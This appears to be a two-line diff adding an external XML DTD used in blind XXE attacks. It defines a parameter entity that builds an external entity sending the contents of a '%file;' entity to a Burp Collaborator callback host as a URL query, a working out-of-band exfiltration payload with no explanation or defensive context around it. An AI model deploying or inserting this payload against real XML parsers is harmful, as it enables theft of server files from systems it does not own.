@@ -1,0 +1,2 @@
+<!ENTITY % all "<!ENTITY send SYSTEM 'http://p7xv38s1k35hsjfm7iqj51jzfqli97.burpcollaborator.net/?collect=%file;'>">
+%all;
